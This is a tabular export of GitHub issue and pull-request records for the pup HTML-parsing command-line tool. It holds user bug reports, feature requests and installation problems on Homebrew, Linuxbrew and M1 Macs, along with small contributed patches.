ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/148,777401377,MDU6SXNzdWU3Nzc0MDEzNzc=,148,Support for :nth-child(An+B) where A is negative,23276177,open,FALSE,NA,NA,0,2021-01-02T04:17:31Z,2021-01-02T04:18:18Z,NA,NONE,NA,"I have a need to select the first two children. According to [this MDN doc](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-child#Example_selectors), I should be able to do something like this with CSS selectors:
```
:nth-child(-n+2)
```

I tried this selector with pup, but it behaves like there is no `-` in front of `n`. That is, it behaved the same as `:nth-child(n+2)`.

Is this syntax not supported?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/148/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/148/comments,https://api.github.com/repos/ericchiang/pup/issues/148/events,https://github.com/ericchiang/pup/issues/148,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/147,768199905,MDU6SXNzdWU3NjgxOTk5MDU=,147,Pup Fails to Run on an M1 Mac in Big Sur,2946567,closed,FALSE,NA,NA,2,2020-12-15T21:00:28Z,2020-12-16T22:22:45Z,2020-12-16T22:22:45Z,NONE,NA,"I cannot get `pup` to run on my M1 Mac mini. I downloaded the latest build from the Downloads page, but I'm always getting `Segmentation fault: 11` when run in Bash, or `fish: 'pup' terminated by signal SIGSEGV (Address boundary error)` when run in my default shell, Fish. I've allowed it in Security preferences, but there seems to be a crash going on. I tried installing with `brew`, but that gets stuck with the install of Go on the ARM architecture.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/147/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/147/comments,https://api.github.com/repos/ericchiang/pup/issues/147/events,https://github.com/ericchiang/pup/issues/147,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/146,734027561,MDU6SXNzdWU3MzQwMjc1NjE=,146,Brew install github url is disabled by default,145172,closed,FALSE,NA,NA,2,2020-11-01T18:08:14Z,2020-11-03T10:50:17Z,2020-11-03T10:50:16Z,NONE,NA,"```
➜ ~ git:(master) ✗ brew install https://raw.githubusercontent.com/EricChiang/pup/master/pup.rb

Updating Homebrew...
==> Auto-updated Homebrew!
Updated 1 tap (homebrew/core).
==> Updated Formulae
Updated 1 formula.

Error: Calling Non-checksummed download of pup formula file from an arbitrary URL is disabled! Use 'brew extract' or 'brew create' and 'brew tap-new' to create a formula file in a tap on GitHub instead.
```

I guess the readme should be updated",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/146/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/146/comments,https://api.github.com/repos/ericchiang/pup/issues/146/events,https://github.com/ericchiang/pup/issues/146,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/145,733902101,MDU6SXNzdWU3MzM5MDIxMDE=,145,How to install pup for all users (i.e. in /usr/local/bin/) for Linux,4569306,open,FALSE,NA,NA,13,2020-11-01T07:19:27Z,2021-04-23T15:07:57Z,NA,NONE,NA,"Hi,

Can you please update your [README.md](../blob/master/README.md#install) to explain how to install pup for all users (i.e. in /usr/local/bin/) ?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/145/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/145/comments,https://api.github.com/repos/ericchiang/pup/issues/145/events,https://github.com/ericchiang/pup/issues/145,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/144,733901959,MDU6SXNzdWU3MzM5MDE5NTk=,144,How to install pup for all users (i.e. in /usr/local/bin/),4569306,closed,FALSE,NA,NA,2,2020-11-01T07:18:36Z,2021-01-09T17:13:31Z,2021-01-09T17:13:31Z,NONE,NA,"Hi,

Can you please update your [README.md](../blob/master/README.md) to explain how to install pup for all users (i.e. in /usr/local/bin/) ?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/144/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/144/comments,https://api.github.com/repos/ericchiang/pup/issues/144/events,https://github.com/ericchiang/pup/issues/144,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/143,713178073,MDU6SXNzdWU3MTMxNzgwNzM=,143,Unable to brew install - arbitrary URL is disabled,21065646,closed,FALSE,NA,NA,5,2020-10-01T20:56:06Z,2020-11-03T10:48:31Z,2020-10-02T02:52:36Z,NONE,NA,"Hey All,
This looks like a great package, but I am having trouble getting started. Can you please verify my command? The response is not encouraging.

`brew install https://raw.githubusercontent.com/EricChiang/pup/master/pup.rb`

`Calling Non-checksummed download of pup formula file from an arbitrary URL is disabled!`",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/143/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/143/comments,https://api.github.com/repos/ericchiang/pup/issues/143/events,https://github.com/ericchiang/pup/issues/143,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/142,708335343,MDExOlB1bGxSZXF1ZXN0NDkyNTgzNDQ0,142,Make compatible with Python 3,7978161,open,FALSE,NA,NA,0,2020-09-24T17:06:11Z,2020-09-24T17:06:11Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/142/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/142/comments,https://api.github.com/repos/ericchiang/pup/issues/142/events,https://github.com/ericchiang/pup/pull/142,https://api.github.com/repos/ericchiang/pup/pulls/142
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/141,707614408,MDU6SXNzdWU3MDc2MTQ0MDg=,141,"Attribute values selectors with whitespaces report ""Unmatched open brace""",53661808,open,FALSE,NA,NA,0,2020-09-23T19:12:27Z,2020-09-23T19:12:27Z,NA,NONE,NA,"When using `| pup 'a[alt=""last page""]'`, the error `Selector parsing error: Unmatched open brace '['` is thrown.

However, this is the correct formatting because quoted values are treated as strings in the CSS spec, so the whitespace should not be considered an error.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/141/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/141/comments,https://api.github.com/repos/ericchiang/pup/issues/141/events,https://github.com/ericchiang/pup/issues/141,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/140,704800062,MDU6SXNzdWU3MDQ4MDAwNjI=,140,Specific tag hierarchies seem to not work,2605791,open,FALSE,NA,NA,0,2020-09-19T04:36:23Z,2020-09-19T04:56:23Z,NA,NONE,NA,"Firstly, amazing project. What a useful tool, and great idea. Thanks for sharing.

## Background 

If I run this on a webpage, with deeply structured HTML. I do not always get the results I expected.

<details>
<summary>Sample page (page.html in example)</summary>

`main` tag, with a nested `nav`, which itself has `ul`, `li`, that have `a` anchor links

```html
<!doctype html>
<html>
<body>
<main id=""content"">
    <nav>
    <ul>
      <li><a href=""https://example.com/?some-params"">Some link 1</a>
      <li><a href=""https://example.com/?some-params"">Some link 2</a>
      <li><a href=""https://example.com/?some-params"">Some link 3</a>
      <li><a href=""https://example.com/?some-params"">Some link 4</a>
      <li><a href=""https://example.com/?some-params"">Some link 5</a>
    </ul>
    </nav>
</main>
</body>
</html>
```

</details>

`cat page.html | pup 'main a'` does not return anything.

## Workaround

If I add an ID or class, it works exactly as expected.

## No action needed

I don't expect or need this ""changed"" or ""fixed"" as such. The software is what it is, but I think it's good documentation of an unexpected behaviour, and perhaps a future feature request for the brave.

**Update** _In switching `main` for `div` the code does what I originally intended it to_",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/140/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/140/comments,https://api.github.com/repos/ericchiang/pup/issues/140/events,https://github.com/ericchiang/pup/issues/140,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/139,692958571,MDExOlB1bGxSZXF1ZXN0NDc5NDk5NTc1,139,Enabled multiple attribute matchers for same attribute.,3542252,open,FALSE,NA,NA,0,2020-09-04T09:27:28Z,2020-09-04T09:27:28Z,NA,NONE,NA,"A selector with multiple attribute selectors on the same attribute would use only the last selector,
because `selector.Attr[attrname]` gets overwritten. Something like 'a[href^=https][href$=.zip]'
would give the results from 'a[href$=.zip]'.

Now, the attribute selectors are collected into a list, and we check whether all selectors match.",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/139/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/139/comments,https://api.github.com/repos/ericchiang/pup/issues/139/events,https://github.com/ericchiang/pup/pull/139,https://api.github.com/repos/ericchiang/pup/pulls/139
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/138,656942364,MDExOlB1bGxSZXF1ZXN0NDQ5MTQ5OTEy,138,add SPEC file for RPM building,186807,open,FALSE,NA,NA,0,2020-07-14T22:45:14Z,2020-07-14T22:45:14Z,NA,NONE,NA,"Here's a SPEC file to help build RPM files.

```
$ spectool -g -R pup.spec
$ rpmbuild -ba pup.spec
```",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/138/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/138/comments,https://api.github.com/repos/ericchiang/pup/issues/138/events,https://github.com/ericchiang/pup/pull/138,https://api.github.com/repos/ericchiang/pup/pulls/138
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/137,654326953,MDU6SXNzdWU2NTQzMjY5NTM=,137,"Requested: --color=always option, for piping to other cmds",63074,open,FALSE,NA,NA,0,2020-07-09T20:26:26Z,2020-07-09T20:26:26Z,NA,NONE,NA,"ATM I can see that the `--color` flag does work interactively. However when piping to other commands (such as `head` or `tail`) then the flag no longer works.

I checked around and this appears to be because the sending program (your program `pup` in this particular instance). Is switching off colors for non interactive output.

This is actually a desirable characteristic. Unfortunately it cannot be overriden. Wheras other standard linux commands have a special flags to force color to be piped always. For example:

```sh
ls --color=always | head
```

Works fine. This shows me that it's not actually the receiving command (for example `head` in this example). That is not the thing taking the colors away.

Please see if there is any way that you can add this feature within the Go frameworks / libs environment. Thank you. BTW it might also be interesting to see what `jq` is doing too. Since this program is intended to be similar to `jq`. I would then like to request that feature over there if it's also missing from `jq`. Just haven't checked up on that yet. Kind Regards.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/137/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/137/comments,https://api.github.com/repos/ericchiang/pup/issues/137/events,https://github.com/ericchiang/pup/issues/137,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/136,644797966,MDU6SXNzdWU2NDQ3OTc5NjY=,136,<div/><div/> and other pairs of short tags are incorrectly nested,5345337,open,FALSE,NA,NA,3,2020-06-24T17:47:42Z,2021-01-11T17:02:25Z,NA,NONE,NA,"Command
```shell
echo '<div/><div/>' | pup
```

Expected output
```html
<html>
 <head>
 </head>
 <body>
  <div>
  </div>
  <div>
  </div>
 </body>
</html>
```

Actual output
```html
<html>
 <head>
 </head>
 <body>
  <div>
   <div>
   </div>
  </div>
 </body>
</html>
```
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/136/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/136/comments,https://api.github.com/repos/ericchiang/pup/issues/136/events,https://github.com/ericchiang/pup/issues/136,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/135,615295433,MDExOlB1bGxSZXF1ZXN0NDE1NjU0OTQ0,135,"Added a test for rkt, removed the option to close on error",926735,open,FALSE,NA,NA,0,2020-05-10T01:40:46Z,2020-05-10T01:40:46Z,NA,NONE,NA,Added a couple comments and a simple test for rkt.  Gives an error on failure to find rkt and points the user in a direction to attempt to remedy it for their specific operating system.,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/135/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/135/comments,https://api.github.com/repos/ericchiang/pup/issues/135/events,https://github.com/ericchiang/pup/pull/135,https://api.github.com/repos/ericchiang/pup/pulls/135
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/134,602447842,MDU6SXNzdWU2MDI0NDc4NDI=,134,"Cannot select two attributes with two ""attr{}"" calls on the same line",4569306,open,FALSE,NA,NA,3,2020-04-18T12:21:25Z,2020-09-21T17:52:30Z,NA,NONE,NA,"Hi,
I'm using `pup v0.4.0`

I cannot select two different attributes using `attr{}` :
 
Selecting the `title` attribute of the `link[type=""application/x-wiki""]` element : 
```css
$ curl -qs http://en.wikipedia.org/wiki/Robots_exclusion_standard | pup 'link[type=""application/x-wiki""] attr{title}'
Edit this page
```
Selecting the `rel` attribute of the `link[type=""application/x-wiki""]` element : 
```css
$ curl -qs http://en.wikipedia.org/wiki/Robots_exclusion_standard | pup 'link[type=""application/x-wiki""] attr{rel}'
alternate
```
Selecting both attributes of the `link[type=""application/x-wiki""]` element : 
```css
$ curl -qs http://en.wikipedia.org/wiki/Robots_exclusion_standard | pup 'link[type=""application/x-wiki""] attr{title},link[type=""application/x-wiki""] attr{rel}'
alternate
```
As you can see, `pup` only selected the last one.

Can you please have a look ?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/134/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/134/comments,https://api.github.com/repos/ericchiang/pup/issues/134/events,https://github.com/ericchiang/pup/issues/134,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/133,598989618,MDU6SXNzdWU1OTg5ODk2MTg=,133,Linuxbrew Bottle Corrupt,2790092,closed,FALSE,NA,NA,2,2020-04-13T16:32:02Z,2020-04-14T01:36:40Z,2020-04-14T01:36:39Z,NONE,NA,"I got the Linuxbrew bottle downloaded but it says the file is not executable and cannot execute binary file.

After `chmod`ing the file, I get: `cannot execute binary file: Exec format error`

```
johria@DESKTOP-KTRH652:~$ brew update && brew install pup
Already up-to-date.
==> Downloading https://linuxbrew.bintray.com/bottles/pup-0.4.0.x86_64_linux.bottle.1.tar.gz
Already downloaded: /home/johria/.cache/Homebrew/downloads/74cd194299ea70ed30e5605660e988ff1fcc716c6eeb3d7fb4e9046f27490914--pup-0.4.0.x86_64_linux.bottle.1.tar.gz
==> Pouring pup-0.4.0.x86_64_linux.bottle.1.tar.gz
🍺  /home/linuxbrew/.linuxbrew/Cellar/pup/0.4.0: 5 files, 3.9MB
johria@DESKTOP-KTRH652:~$ pup
-bash: /home/linuxbrew/.linuxbrew/bin/pup: Permission denied
johria@DESKTOP-KTRH652:~$ ls -lha /home/linuxbrew/.linuxbrew/bin/pup
lrwxrwxrwx 1 johria johria 27 Apr 13 12:27 /home/linuxbrew/.linuxbrew/bin/pup -> ../Cellar/pup/0.4.0/bin/pup

johria@DESKTOP-KTRH652:~$ ls -lha /home/linuxbrew/.linuxbrew/Cellar/pup/0.4.0/bin/pup
-r--r--r-- 1 johria johria 3.9M Jul 23  2016 /home/linuxbrew/.linuxbrew/Cellar/pup/0.4.0/bin/pup

johria@DESKTOP-KTRH652:~$ chmod +x  /home/linuxbrew/.linuxbrew/Cellar/pup/0.4.0/bin/pup
johria@DESKTOP-KTRH652:~$ pup
-bash: /home/linuxbrew/.linuxbrew/bin/pup: cannot execute binary file: Exec format error
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/133/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/133/comments,https://api.github.com/repos/ericchiang/pup/issues/133/events,https://github.com/ericchiang/pup/issues/133,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/132,586794103,MDU6SXNzdWU1ODY3OTQxMDM=,132,Support for linux variants through Homebrew -> Linuxbrew,1408353,closed,FALSE,NA,NA,3,2020-03-24T08:48:25Z,2020-04-14T07:22:55Z,2020-04-14T07:22:55Z,NONE,NA,"https://github.com/ericchiang/pup/blob/681d7bb639334bf485476f5872c5bdab10931f9a/pup.rb#L3

Installing pup through linuxbrew on a linux machine retrieves the darwin executable and therefore is unusable.

So there would be some additions needed for linux.x86_64, linux.386, linux.arm, linux.arm64, or simply all platforms you're supporting. 👍

Should be almost a no-brainer for ppl knowing how to ""package"" for Homebrew.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/132/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/132/comments,https://api.github.com/repos/ericchiang/pup/issues/132/events,https://github.com/ericchiang/pup/issues/132,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/131,579370462,MDU6SXNzdWU1NzkzNzA0NjI=,131,how to install pup in raspbian (raspberry pi 2),5803612,open,FALSE,NA,NA,4,2020-03-11T15:56:38Z,2020-10-26T23:46:58Z,NA,NONE,NA,"Hi!
What version shoud I download? I try with Linux arm but not works.
thanks!
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/131/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/131/comments,https://api.github.com/repos/ericchiang/pup/issues/131/events,https://github.com/ericchiang/pup/issues/131,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/130,576162146,MDU6SXNzdWU1NzYxNjIxNDY=,130,Get text between two span,61826987,open,FALSE,NA,NA,2,2020-03-05T10:48:29Z,2020-12-02T04:51:18Z,NA,NONE,NA,"Hi, firstly, thanks you for your good job with pup :)

I would like to recover a text contained between 2 span in an html ('France - Brésil' in this exemple) and I do not find a function of the kind following element. Is there a way to do this ?

This is an exemple of html portion code concerned : 

```
<td class=""match sep"">
	<a class=""infos"" href=""javascript:void(0);"">
		<span class=""sport rugby"">
		</span>
		France - Brésil
		<span class=""details-ps"">
			<strong>
			<span class=""ico_flag flag_wrd""></span>
			Super Rugby
			</strong>
			blablablabla
			<br />
		</span>
    </a>
</td>
```

Thanks in advance for your response",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/130/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/130/comments,https://api.github.com/repos/ericchiang/pup/issues/130/events,https://github.com/ericchiang/pup/issues/130,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/129,559359678,MDU6SXNzdWU1NTkzNTk2Nzg=,129,apt-get install pup,3918865,open,FALSE,NA,NA,5,2020-02-03T21:59:23Z,2020-11-30T03:33:46Z,NA,NONE,NA,Do you consider adding an apt repository? ;-),NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/129/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/129/comments,https://api.github.com/repos/ericchiang/pup/issues/129/events,https://github.com/ericchiang/pup/issues/129,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/128,559327841,MDExOlB1bGxSZXF1ZXN0MzcwNTE3ODYw,128,Add Dockerfile,432791,open,FALSE,NA,NA,3,2020-02-03T20:53:59Z,2020-11-09T20:18:53Z,NA,NONE,NA,"Adds a Dockerfile, which you might use in automated builds on the Dockerhub.

Relates to #126
",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/128/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/128/comments,https://api.github.com/repos/ericchiang/pup/issues/128/events,https://github.com/ericchiang/pup/pull/128,https://api.github.com/repos/ericchiang/pup/pulls/128
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/127,555351362,MDU6SXNzdWU1NTUzNTEzNjI=,127,intent -> indent,10137,closed,FALSE,NA,NA,0,2020-01-27T04:34:20Z,2020-02-04T06:01:10Z,2020-02-04T06:01:10Z,NONE,NA,"Typo in README.
s/intent level/indent level/

Awesome utility! Thanks a lot!",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/127/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/127/comments,https://api.github.com/repos/ericchiang/pup/issues/127/events,https://github.com/ericchiang/pup/issues/127,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/126,548916159,MDU6SXNzdWU1NDg5MTYxNTk=,126,Interest in a Dockerfile?,432791,open,FALSE,NA,NA,2,2020-01-13T13:04:07Z,2020-02-03T20:55:11Z,NA,NONE,NA,"Hey, thanks for the great tool!

We internally created a little Dockerfile to ease the distribution and usage of pup. Would you be interested in a pull request to add a Dockerfile, so that there might be an official image on the Docker Hub?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/126/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/126/comments,https://api.github.com/repos/ericchiang/pup/issues/126/events,https://github.com/ericchiang/pup/issues/126,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/125,514557101,MDU6SXNzdWU1MTQ1NTcxMDE=,125,"Parsing empty cells, or specific element",23077417,open,FALSE,NA,NA,0,2019-10-30T10:36:07Z,2019-10-30T10:36:07Z,NA,NONE,NA,"Got a table :
```
<tr>
  <td>Simple text node
    </td>
  <td>
      <p>First line</p>
      <p>Second line</p>
      <p>Third line</p>
    </td>
  <td>
    </td>
  <td>
      <div>Something</div>
    </td>
</tr>
```
pup -f ""test.htm"" ""tr td text{}"" gives :
```
Simple text node
First line
Second line
Third line
Something
```
pup -f ""test.htm"" ""tr td p:first-of-type text{}"" gives :
```
First line
```
I'd like to get as many lines than there are cells in the table, if possible just the first line of text if there are more than one, or a newline if the cell is empty :
```
Simple text node
First line

Something
```
Any idea ? Regards.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/125/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/125/comments,https://api.github.com/repos/ericchiang/pup/issues/125/events,https://github.com/ericchiang/pup/issues/125,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/124,512901055,MDU6SXNzdWU1MTI5MDEwNTU=,124,Feature Request: Multiple keys in attr{} display function,5158194,open,FALSE,NA,NA,0,2019-10-27T00:11:56Z,2019-10-27T00:11:56Z,NA,NONE,NA,"For example, a link with both an href and a title can be printed by using attr{title, href}. This would prevent having to parse the output 2+ times to get certain attributes, and also prevent having to use a json or text parser.

I suppose the easiest way to implement it would be on consecutive lines, e.g.

```
% pup a attr{title, href}
title1
href1
title2
href2
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/124/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/124/comments,https://api.github.com/repos/ericchiang/pup/issues/124/events,https://github.com/ericchiang/pup/issues/124,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/123,506862676,MDU6SXNzdWU1MDY4NjI2NzY=,123,pup crashes upon launching,49454925,open,FALSE,NA,NA,4,2019-10-14T20:38:47Z,2020-08-17T08:58:33Z,NA,NONE,NA,"On the latest version of pup, it crashes upon launching
```
~/tmp> shasum pup
7a99b6411ea5c01e7439c8c3d5612be43256dd54  pup
~/tmp> ./pup
fish: './pup' terminated by signal SIGSEGV (Address boundary error)
~/tmp> uname -a
Darwin Jonathans-MBP.localdomain 18.7.0 Darwin Kernel Version 18.7.0: Tue Aug 20 16:57:14 PDT 2019; root:xnu-4903.271.2~2/RELEASE_X86_64 x86_64 i386 MacBookPro15,1 Darwin
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/123/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/123/comments,https://api.github.com/repos/ericchiang/pup/issues/123/events,https://github.com/ericchiang/pup/issues/123,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/122,503020522,MDU6SXNzdWU1MDMwMjA1MjI=,122,Feature request: case-insensitivity in attribute selectors,32907086,open,FALSE,NA,NA,0,2019-10-05T21:46:41Z,2019-10-05T21:46:41Z,NA,NONE,NA,Any chance of adding `i/I` as `[attr operator value i]` for case-insensitivity?,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/122/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/122/comments,https://api.github.com/repos/ericchiang/pup/issues/122/events,https://github.com/ericchiang/pup/issues/122,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/121,491881523,MDExOlB1bGxSZXF1ZXN0MzE2MTY0MDY3,121,Support wildcard element selector,361055,open,FALSE,NA,NA,0,2019-09-10T20:29:42Z,2019-09-10T20:29:42Z,NA,NONE,NA,"Supports the wildcard `*` to match any type of HTML element, as requested in Issue #120. Also, the expected_output.txt file had apparently missed some updates; my pre-modification install of pup didn't generate the same SHAs for either `json{}` or `#toc li + a json{}`.",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/121/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/121/comments,https://api.github.com/repos/ericchiang/pup/issues/121/events,https://github.com/ericchiang/pup/pull/121,https://api.github.com/repos/ericchiang/pup/pulls/121
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/120,491837902,MDU6SXNzdWU0OTE4Mzc5MDI=,120,Feature request: wildcard selector,21128864,open,FALSE,NA,NA,1,2019-09-10T18:47:43Z,2021-03-25T15:48:37Z,NA,NONE,NA,"In CSS, I can use something like `tr *:first-child` to select the first child of every `<tr>`, regardless of the element's tag (here, presumably `<td>` or `<th>`). Pup should support this selector.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/120/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/120/comments,https://api.github.com/repos/ericchiang/pup/issues/120/events,https://github.com/ericchiang/pup/issues/120,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/119,438980306,MDU6SXNzdWU0Mzg5ODAzMDY=,119,[BUG]Cannot select two attributes,4569306,closed,FALSE,NA,NA,1,2019-04-30T21:13:43Z,2020-04-18T12:12:01Z,2020-04-18T12:12:01Z,NONE,NA,"Hi,

First I select the urls : 
```css
$ curl -qs https://ok.ru/video/c335170 | pup '.video-card_lk attr{href}' | head -5
/video/37630118466?st._aid=VideoState_open_album
/video/37668325954?st._aid=VideoState_open_album
/video/37609736770?st._aid=VideoState_open_album
/video/37595712066?st._aid=VideoState_open_album
/video/37601413698?st._aid=VideoState_open_album
```
and then, the titles : 
```css
$ curl -qs https://ok.ru/video/c335170 | pup '.ellip attr{title}' | head -5
Ugly Betty 4x20
Ugly Betty 4x19
Ugly Betty 4x18
Ugly Betty 4x17
Ugly Betty 4x16
```

and finally both urls and titles by using the `,` operator, but shomehow, it does not work : 
```css
$ curl -qs https://ok.ru/video/c335170 | pup '.video-card_lk attr{href}, .ellip attr{title}' | head -5
Ugly Betty 4x20
Ugly Betty 4x19
Ugly Betty 4x18
Ugly Betty 4x17
Ugly Betty 4x16
```
Can you please help me ?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/119/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/119/comments,https://api.github.com/repos/ericchiang/pup/issues/119/events,https://github.com/ericchiang/pup/issues/119,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/118,438961275,MDU6SXNzdWU0Mzg5NjEyNzU=,118,The comma operator does not work with pup v0.4.0,4569306,closed,FALSE,NA,NA,1,2019-04-30T20:24:27Z,2019-04-30T20:39:33Z,2019-04-30T20:39:13Z,NONE,NA,"Hi,
According to your example at https://github.com/EricChiang/pup#--and- pup is supposed to print : 
```css
$ cat robots.html | pup 'title, h1 span[dir=""auto""]'
<title>
 Robots exclusion standard - Wikipedia, the free encyclopedia
</title>
<span dir=""auto"">
 Robots exclusion standard
</span>
```
but pup v0.4.0 shows : 
```css
$ cat robots.html | pup 'title, h1 span[dir=""auto""]'
<title>
 Robots exclusion standard - Wikipedia
</title>
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/118/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/118/comments,https://api.github.com/repos/ericchiang/pup/issues/118/events,https://github.com/ericchiang/pup/issues/118,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/117,437769988,MDU6SXNzdWU0Mzc3Njk5ODg=,117,Feature Request: meaningful return values,2433242,open,FALSE,NA,NA,0,2019-04-26T17:22:42Z,2019-04-26T17:22:42Z,NA,NONE,NA,"Right now pup returns 0 whether or not any match was found. This makes it very difficult to use in scripts as we cannot tell the difference between e.g. a form input with an empty value versus one with no value at all.

Please consider returning 1 in cases where no match was found.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/117/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/117/comments,https://api.github.com/repos/ericchiang/pup/issues/117/events,https://github.com/ericchiang/pup/issues/117,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/116,433580438,MDExOlB1bGxSZXF1ZXN0MjcwNzUxNDE5,116,Update brew install instructions,4328141,open,FALSE,NA,NA,2,2019-04-16T04:38:16Z,2021-01-01T12:15:25Z,NA,NONE,NA,Previously incompatible binary version was downloaded that caused segmentation fault.,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/116/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/116/comments,https://api.github.com/repos/ericchiang/pup/issues/116/events,https://github.com/ericchiang/pup/pull/116,https://api.github.com/repos/ericchiang/pup/pulls/116
